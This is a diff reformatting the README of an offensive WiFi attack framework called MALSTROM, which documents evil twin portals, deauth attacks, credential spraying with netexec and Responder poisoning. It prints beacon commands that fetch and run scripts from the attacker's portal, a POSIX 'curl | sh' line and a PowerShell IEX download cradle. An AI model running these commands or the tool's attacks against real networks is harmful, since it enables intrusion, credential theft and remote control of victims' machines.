@@ -23,7 +23,7 @@
 
 ---
 
-### ⚡ All-in-One WiFi Attack & Post-Exploitation Framework for Linux
+⚡ **All-in-One WiFi Attack & Post-Exploitation Framework for Linux**
 
 MALSTROM automates rogue access point deployment, evil twin portals, deauth/disassociation attacks, KARMA spoofing, MITM poisoning, recon scanning, and lateral movement from a unified real-time dashboard.
 
@@ -31,7 +31,7 @@ MALSTROM automates rogue access point deployment, evil twin portals, deauth/disa
 
 ---
 
-## 📊 Project Stats
+### 📊 Project Stats
 
 | Metric | Value |
 | :--- | :--- |
@@ -44,7 +44,7 @@ MALSTROM automates rogue access point deployment, evil twin portals, deauth/disa
 
 ---
 
-## 📖 Description
+### 📖 Description
 
 **DarkSec MALSTROM** automates the end-to-end WiFi attack vector from a single process. It handles target SSID cloning, frame injection, and OS-adaptive captive portal deployment while driving an interactive web dashboard bound to `http://127.0.0.1:8888`.
 
@@ -69,12 +69,12 @@ The rogue AP runs on a virtual interface (`ap0`) carved from a spare radio to pr
 > This tool is intended for authorized penetration testing, network troubleshooting, or educational research only. Unauthorized use against networks you do not own or have explicit permission to test is illegal.
 > 
 ✨ Features
- * Zero-Configuration Deployment — Single command installation script that automatically sets up system dependencies, Python environments, and binary shortcuts.
- * Real-Time Web UI — Operator dashboard running on 127.0.0.1:8888 backed by SSE live streams for real-time telemetry, credential feeds, and target maps.
- * Virtual Radio Management — Carves an ap0 interface from secondary radio hardware to prevent management dropouts during rogue AP campaigns.
- * Targeted Deauth Modes — Broadcast, targeted MAC, and silent adaptive modes that trigger frame injection only when active client traffic is detected.
- * Automated Handshake & PMKID Harvesting — EAPOL 4-way sniffer and PMKID extractor with auto-filtering for internal access point traffic.
- * Integrated Post-Exploitation — Automated nmap scanning, netexec credential spraying (SMB, SSH, RDP, WinRM), and Responder LLMNR/mDNS/NBT-NS poisoning.
+ * Zero-Configuration Deployment — Single-command setup script that automatically handles dependencies and binary shortcuts.
+ * Real-Time Web UI — Operator dashboard running on 127.0.0.1:8888 backed by live SSE streams for telemetry and credential feeds.
+ * Virtual Radio Management — Carves an ap0 interface from secondary radio hardware to prevent management dropouts.
+ * Targeted Deauth Modes — Broadcast, targeted MAC, and silent adaptive modes that trigger injection on active client traffic.
+ * Automated Handshake & PMKID Harvesting — EAPOL sniffer and PMKID extractor with internal AP noise filtering.
+ * Integrated Post-Exploitation — Automated nmap scanning, netexec credential spraying (SMB, SSH, RDP, WinRM), and Responder poisoning.
  * C2 Session Management — Generates lightweight payload beacons for POSIX (sh) and Windows (PowerShell) targets.
 🛠️ Requirements
  * Hardware: Minimum 2 WiFi interfaces (1 supporting monitor mode/injection + 1 supporting AP mode).
@@ -95,45 +95,47 @@ The rogue AP runs on a virtual interface (`ap0`) carved from a spare radio to pr
  * License
 ⚙️ Installation
 🚀 One-Line Quick Install
-Run the quick setup script to install all required dependencies, clone the repository, and register the system symlinks:
 curl -sSL [https://raw.githubusercontent.com/wickednull/malstrom/main/install.sh](https://raw.githubusercontent.com/wickednull/malstrom/main/install.sh) | sudo bash
 
 🔧 Manual Installation
-If preferred, clone the repository and run the setup manually:
-# 1. Clone the repository
-git clone [https://github.com/wickednull/malstrom.git](https://github.com/wickednull/malstrom.git)
+ * Clone the repository:
+   git clone [https://github.com/wickednull/malstrom.git](https://github.com/wickednull/malstrom.git)
 cd malstrom
 
-# 2. Make binaries executable
-chmod +x bin/malstrom
+ * Make binaries executable:
+   chmod +x bin/malstrom
 
-# 3. Install core system dependencies (Debian/Ubuntu/Kali)
-sudo apt update && sudo apt install -y \
-  python3 hostapd dnsmasq iptables iw \
-  aireplay-ng tcpdump nmap responder
+ * Install system dependencies (Debian/Ubuntu/Kali):
+   sudo apt update && sudo apt install -y python3 hostapd dnsmasq iptables iw aireplay-ng tcpdump nmap responder
 
-# 4. Perform environment readiness check
-sudo ./bin/malstrom --check
+ * Perform environment readiness check:
+   sudo ./bin/malstrom --check
 
 💻 Usage
 Launch MALSTROM directly using the CLI management binary:
-# Full stack execution (Engine + Captive Portal + Web Dashboard)
 sudo malstrom
 
-# Launch and automatically open the operator dashboard in default browser
+Launch and automatically open the dashboard in your default browser:
 sudo malstrom --open
 
-# Launch without token gate enforcement on localhost
+Launch without token gate enforcement on localhost:
 sudo malstrom --no-auth
 
 🕹️ CLI Service Commands
-sudo malstrom start       # Start background daemon & display access details
-sudo malstrom launch      # Start daemon if needed and launch signed-in UI
-malstrom open             # Open dashboard with auto-filled access token
-malstrom token            # Print current operator access token
+Start background daemon:
+sudo malstrom start
+
+Launch daemon and signed-in UI:
+sudo malstrom launch
+
+Open dashboard with auto-filled access token:
+malstrom open
+
+Print current operator access token:
+malstrom token
 
 🖥️ Dashboard Workspaces
-| Tab | Functionality |
+| Workspace Tab | Functionality |
 |---|---|
 | Attack | Configure BSSID/SSID/Channel targets, portal modes, and deauth burst rates. |
 | Payload | Manage WPA handshake/PMKID capture parameters and upload custom HTML portal templates. |
@@ -146,23 +148,21 @@ malstrom token            # Print current operator access token
 | Settings | Manage LAN binding, access tokens, beacon key rotation, and factory resets. |
 ⚙️ Post-Exploitation Modules
 1. Recon & Mapping
-Executes network sweeps across target subnets (including rogue 172.16.52.0/24 or accessible LAN CIDRs). Results feed directly into the credential spray engine.
-# Executed via Web Dashboard or CLI Orchestrator
+Executes network sweeps across target subnets (including rogue 172.16.52.0/24 or accessible LAN CIDRs).
 malstrom recon scan --target 172.16.52.0/24
 
 2. Lateral Movement (Credential Spray)
 Runs netexec against target hosts using harvested credentials across supported protocols:
 netexec <protocol> <target_cidr> -u <user> -p <pass>
 
-Successful authentication vectors are flagged with [+] OWNED alerts and committed to owned.json.
 3. MITM & Poisoning
-Spawns Responder on the rogue AP interface to intercept broadcast name resolution requests (LLMNR/mDNS/NBT-NS). Captured NetNTLMv2 hashes are formatted for hashcat and indexed directly into the Loot vault.
+Spawns Responder on the rogue AP interface to intercept broadcast name resolution requests (LLMNR/mDNS/NBT-NS). Captured NetNTLMv2 hashes are formatted for hashcat.
 4. Beacon Sessions
 Generates light footprint agent scripts for target command execution:
-# POSIX Shell Target
+POSIX Shell Target:
 curl -s http://<portal-ip>/beacon | sh
 
-# PowerShell Target
+PowerShell Target:
 powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<portal-ip>/beacon.ps1')"
 
 📊 Capture & Deauth Specifications
@@ -192,10 +192,10 @@ Harvested data is stored locally in ~/loot/malstrom/ (or /var/lib/malstrom when 
 └── scans.json          # Network recon cache
 
 Maintenance Commands
-# Wipe Loot: Clears captured loot while preserving system configuration
+Wipe captured loot while preserving system configuration:
 sudo malstrom wipe-loot
 
-# Factory Reset: Halts running daemons, deletes all loot, resets state, and clears access tokens
+Halt running daemons, delete all loot, reset state, and clear access tokens:
 sudo malstrom reset
 
 📂 Repository Structure
@@ -219,9 +219,15 @@ MALSTROM/
 🤝 Contributing
 Contributions are welcome!
  * Fork the repository (https://github.com/wickednull/malstrom/fork).
- * Create your feature branch (git checkout -b feature/amazing-feature).
- * Commit your changes (git commit -m 'Add amazing feature').
- * Push to the branch (git push origin feature/amazing-feature).
+ * Create your feature branch:
+   git checkout -b feature/amazing-feature
+
+ * Commit your changes:
+   git commit -m 'Add amazing feature'
+
+ * Push to the branch:
+   git push origin feature/amazing-feature
+
  * Open a Pull Request.
 ⚠️ Disclaimer
 Use at your own risk. The authors assume no liability for misuse or damage caused by this tool. MALSTROM is provided as-is for security research and authorized testing only. Always obtain proper written permission before testing on any network or device.
